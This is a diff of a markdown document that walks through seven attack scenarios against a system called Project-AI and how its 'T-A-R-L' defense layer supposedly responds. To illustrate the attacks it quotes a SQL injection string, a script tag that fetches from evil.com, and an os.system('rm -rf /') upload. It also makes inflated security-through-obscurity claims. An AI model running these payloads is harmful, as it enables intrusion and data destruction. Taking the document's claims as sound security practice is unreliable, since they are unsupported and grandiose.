@@ -9,6 +9,7 @@ T-A-R-L (Thirsty's Active Resistant Language) is Thirsty-lang with defensive sec
 ## Scenario 1: SQL Injection Attack Detection and Defense
 
 ### The Attack Situation
+
 An attacker attempts to exploit a database query endpoint in Project-AI.
 
 **Attack Input:**
@@ -20,6 +21,7 @@ password: anything
 ### How T-A-R-L Responds
 
 #### Step 1: Cerberus Detects the Threat
+
 ```python
 # Cerberus analyzes the input
 threat_detected = {
@@ -32,6 +34,7 @@ threat_detected = {
 ```
 
 #### Step 2: Bridge Analyzes and Identifies Opportunity
+
 ```python
 # CerberusCodexBridge processes the threat
 bridge = CerberusCodexBridge()
@@ -43,6 +46,7 @@ opportunities = bridge.process_threat_engagement(threat_detected, cerberus_respo
 ```
 
 #### Step 3: T-A-R-L Buffs the Code
+
 ```python
 # TARLCodeProtector defends the code under siege
 tarl = TARLCodeProtector()
@@ -92,12 +96,14 @@ def get_user(username, password):
 ```
 
 #### Step 4: What the Attacker Experiences
+
 - **Their input is neutralized**: `admin' OR '1'='1` becomes `admin OR 11`
 - **Their attack fails**: The SQL injection doesn't work
 - **They're confused**: The code execution is being manipulated but they don't know why
 - **They can't analyze it**: T-A-R-L uses language features they don't have access to
 
 #### Step 5: Codex Makes it Permanent
+
 ```python
 # Codex Deus Maximus implements permanent fix
 bridge.codex_implement_upgrade({
@@ -109,6 +115,7 @@ bridge.codex_implement_upgrade({
 ```
 
 ### Result
+
 - ✅ Attack blocked
 - ✅ Code 10x stronger
 - ✅ Attacker confused (doesn't understand T-A-R-L)
@@ -119,9 +126,11 @@ bridge.codex_implement_upgrade({
 ## Scenario 2: Code Analysis / Reverse Engineering Attempt
 
 ### The Attack Situation
+
 An attacker tries to analyze Project-AI's AI model training code to steal algorithms.
 
 **Attack Method:**
+
 - Decompiling Python bytecode
 - Analyzing function names
 - Tracing execution flow
@@ -129,6 +138,7 @@ An attacker tries to analyze Project-AI's AI model training code to steal algori
 ### How T-A-R-L Responds
 
 #### Step 1: Cerberus Detects Code Analysis
+
 ```python
 threat_detected = {
     "threat_type": "code_analysis_attempt",
@@ -196,13 +206,15 @@ def _a3b5c7d9(_e8f2a1c4, _d9c8b7a6, _f1e2d3c4):
 ```
 
 #### Step 3: What the Attacker Experiences
+
 1. **Can't understand variable names**: Everything is hashed
-2. **Chases fake vulnerabilities**: Wastes hours on honeypots
-3. **Gets confused by comments**: "There's an API key here!" (it's fake)
-4. **Execution gets halted**: Code manipulates flow to stop unauthorized access
-5. **Can't ask for help**: No one else knows T-A-R-L syntax/features
+1. **Chases fake vulnerabilities**: Wastes hours on honeypots
+1. **Gets confused by comments**: "There's an API key here!" (it's fake)
+1. **Execution gets halted**: Code manipulates flow to stop unauthorized access
+1. **Can't ask for help**: No one else knows T-A-R-L syntax/features
 
 ### Result
+
 - ✅ Algorithm protected through obfuscation
 - ✅ Attacker wastes time on decoys
 - ✅ Real logic hidden using T-A-R-L morphing
@@ -213,6 +225,7 @@ def _a3b5c7d9(_e8f2a1c4, _d9c8b7a6, _f1e2d3c4):
 ## Scenario 3: XSS (Cross-Site Scripting) Attack
 
 ### The Attack Situation
+
 Attacker tries to inject malicious JavaScript into Project-AI's web interface.
 
 **Attack Input:**
@@ -225,6 +238,7 @@ Attacker tries to inject malicious JavaScript into Project-AI's web interface.
 ### How T-A-R-L Responds
 
 #### Step 1: Cerberus Detects XSS
+
 ```python
 threat_detected = {
     "threat_type": "xss_injection",
@@ -236,6 +250,7 @@ threat_detected = {
 ```
 
 #### Step 2: T-A-R-L Applies Shield Policy
+
 ```python
 # Bridge maps "xss" threat to "shield" feature (policy-engine)
 bridge.process_threat_engagement(threat_detected, cerberus_response)
@@ -259,6 +274,7 @@ def handle_user_input(user_data):
 ```
 
 #### Step 3: What the Attacker Sees
+
 **Input:** `<script>fetch('https://evil.com...')</script>`
 **Output:** `fetch('https://evil.com...')`
 
@@ -268,6 +284,7 @@ def handle_user_input(user_data):
 - Can't figure out the filtering logic (T-A-R-L policy-engine)
 
 ### Result
+
 - ✅ XSS attack blocked
 - ✅ User data safely displayed
 - ✅ Policy applied using T-A-R-L features
@@ -277,6 +294,7 @@ def handle_user_input(user_data):
 ## Scenario 4: Brute Force Attack on API
 
 ### The Attack Situation
+
 Attacker attempts to brute force Project-AI's API endpoints with automated tools.
 
 **Attack Pattern:**
@@ -290,6 +308,7 @@ POST /api/login - Attempt 3
 ### How T-A-R-L Responds
 
 #### Step 1: Cerberus Detects Pattern
+
 ```python
 threat_detected = {
     "threat_type": "brute_force_attack",
@@ -302,6 +321,7 @@ threat_detected = {
 ```
 
 #### Step 2: T-A-R-L Adds Rate Limiting with Confusion
+
 ```python
 # T-A-R-L buffs the API handler
 tarl.buff_code("src/app/core/api_handler.py", buff_strength="strong")
@@ -336,12 +356,14 @@ def handle_api_request(request):
 ```
 
 #### Step 3: What the Attacker Experiences
+
 - **Inconsistent responses**: Sometimes error 500, sometimes "invalid credentials"
 - **Unpredictable delays**: Can't calculate rate limits
 - **Wasted resources**: Brute force tool gets confused
 - **No clear pattern**: Can't determine if password is correct or system is broken
 
 ### Result
+
 - ✅ Brute force becomes impractical
 - ✅ Attacker confused by inconsistent behavior
 - ✅ T-A-R-L's confusion buff working
@@ -351,6 +373,7 @@ def handle_api_request(request):
 ## Scenario 5: Code Injection via File Upload
 
 ### The Attack Situation
+
 Attacker tries to upload malicious Python file to execute code on server.
 
 **Malicious File (malware.py):**
@@ -362,6 +385,7 @@ os.system("rm -rf /")  # Attempt to delete everything
 ### How T-A-R-L Responds
 
 #### Step 1: Cerberus Detects Malicious Code
+
 ```python
 threat_detected = {
     "threat_type": "code_injection",
@@ -373,6 +397,7 @@ threat_detected = {
 ```
 
 #### Step 2: T-A-R-L Applies Defensive Compilation
+
 ```python
 # Bridge maps to "defend" feature (defense-compiler)
 # T-A-R-L uses defensive compilation mode
@@ -407,6 +432,7 @@ def process_uploaded_file(file_content):
 ```
 
 #### Step 3: What the Attacker Experiences
+
 - **Thinks upload succeeded**: Gets success message
 - **Expects code to run**: Waits for their malware to execute
 - **Nothing happens**: Code was actually blocked
@@ -414,6 +440,7 @@ def process_uploaded_file(file_content):
 - **Can't debug**: T-A-R-L gave fake success response
 
 ### Result
+
 - ✅ Malicious code blocked
 - ✅ Attacker fooled by fake success
 - ✅ System protected using T-A-R-L defense-compiler
@@ -423,6 +450,7 @@ def process_uploaded_file(file_content):
 ## Scenario 6: Memory Corruption / Buffer Overflow Attempt
 
 ### The Attack Situation
+
 Attacker tries to overflow a buffer to execute arbitrary code.
 
 **Attack Input:**
@@ -434,6 +462,7 @@ payload = "A" * 10000  # Way more than expected
 ### How T-A-R-L Responds
 
 #### Step 1: Cerberus Detects Buffer Overflow
+
 ```python
 threat_detected = {
     "threat_type": "buffer_overflow",
@@ -446,6 +475,7 @@ threat_detected = {
 ```
 
 #### Step 2: T-A-R-L Adds Bounds Checking
+
 ```python
 # Bridge maps to "defend" feature
 tarl.defend_code_under_siege(threat_detected)
@@ -475,12 +505,14 @@ def process_input(user_input):
 ```
 
 #### Step 3: What the Attacker Experiences
+
 - **Input gets truncated**: 10,000 bytes becomes 256 bytes
 - **No error message**: System says "success"
 - **Overflow fails**: Buffer boundaries enforced
 - **Confusion**: "Why didn't the overflow work?"
 
 ### Result
+
 - ✅ Buffer overflow prevented
 - ✅ Memory protected
 - ✅ Attacker confused by silent truncation
@@ -490,18 +522,21 @@ def process_input(user_input):
 ## Scenario 7: Multi-Stage Attack Campaign
 
 ### The Complete Attack Situation
+
 Sophisticated attacker attempts multiple attack vectors simultaneously.
 
 **Attack Campaign:**
+
 1. Reconnaissance (scan for vulnerabilities)
-2. SQL injection attempt
-3. XSS injection attempt
-4. Privilege escalation attempt
-5. Data exfiltration attempt
+1. SQL injection attempt
+1. XSS injection attempt
+1. Privilege escalation attempt
+1. Data exfiltration attempt
 
 ### How T-A-R-L Responds to Coordinated Attack
 
 #### Phase 1: Detection
+
 ```python
 # Cerberus detects multi-vector attack
 threat_campaign = {
@@ -519,6 +554,7 @@ threat_campaign = {
 ```
 
 #### Phase 2: Coordinated Defense
+
 ```python
 # T-A-R-L buff wizard activates maximum defense
 bridge = CerberusCodexBridge()
@@ -565,34 +601,40 @@ bridge.process_threat_engagement(threat_campaign, cerberus_response)
 #### Phase 4: What the Attacker Experiences
 
 **Reconnaissance Phase:**
+
 - Sees normal-looking code (but it's morphed)
 - Finds "vulnerabilities" (they're honeypots)
 - Builds attack plan based on false information
 
 **SQL Injection Phase:**
+
 - Injection gets sanitized
 - Returns "success" but attack failed
 - Confusion: "It worked but I got no data?"
 
 **XSS Phase:**
+
 - Script tags removed
 - No error message
 - JavaScript doesn't execute
 - Confusion: "The input was accepted..."
 
 **Privilege Escalation Phase:**
+
 - Execution gets halted by T-A-R-L check
 - Fake success message returned
 - Privileges never actually elevated
 - Confusion: "I'm admin now but can't do admin things?"
 
 **Data Exfiltration Phase:**
+
 - Fake data returned (generated by T-A-R-L)
 - Real data never exposed
 - Attacker thinks they succeeded
 - Confusion: "This data doesn't make sense..."
 
 ### Result
+
 - ✅ All attack vectors blocked
 - ✅ Attacker completely confused
 - ✅ Thinks some attacks worked (they didn't)
@@ -605,23 +647,27 @@ bridge.process_threat_engagement(threat_campaign, cerberus_response)
 ## Key Benefits Demonstrated
 
 ### 1. **Confusion as Defense**
+
 - Attackers don't know what T-A-R-L is
 - Can't research it (only Project-AI has it)
 - Fake successes and misleading errors confuse them
 - Time wasted on honeypots and decoys
 
 ### 2. **Multi-Layer Protection**
+
 - **Shield**: Execution manipulation
 - **Hide**: Code obfuscation
 - **Scramble**: Fake vulnerabilities
 - **Defend**: Input sanitization
 
 ### 3. **Adaptive Response**
+
 - Severity determines buff strength
 - Multiple buffs stack for coordinated attacks
 - Permanent upgrades via Codex
 
 ### 4. **Unique Advantage**
+
 - Only Project-AI/Cerberus/Codex know T-A-R-L
 - External attackers have no documentation
 - No community support for attackers
@@ -692,10 +738,10 @@ print(f"Integration Status: {status['integration']}")
 T-A-R-L (Thirsty's Active Resistant Language) provides multi-layered defensive protection through:
 
 1. **Immediate Response**: Buffs code under active attack
-2. **Confusion Tactics**: Misleads attackers with fake vulnerabilities
-3. **Execution Manipulation**: Halts unauthorized code progression
-4. **Code Morphing**: Obfuscates implementation details
-5. **Permanent Protection**: Integrates Thirsty-lang security features
-6. **Unique Advantage**: Unknown to external entities
+1. **Confusion Tactics**: Misleads attackers with fake vulnerabilities
+1. **Execution Manipulation**: Halts unauthorized code progression
+1. **Code Morphing**: Obfuscates implementation details
+1. **Permanent Protection**: Integrates Thirsty-lang security features
+1. **Unique Advantage**: Unknown to external entities
 
 **All scenarios demonstrate**: Attackers waste time, get confused, and ultimately fail because they're fighting a programming language (T-A-R-L) that only Project-AI, Cerberus, and Codex Deus Maximus understand.
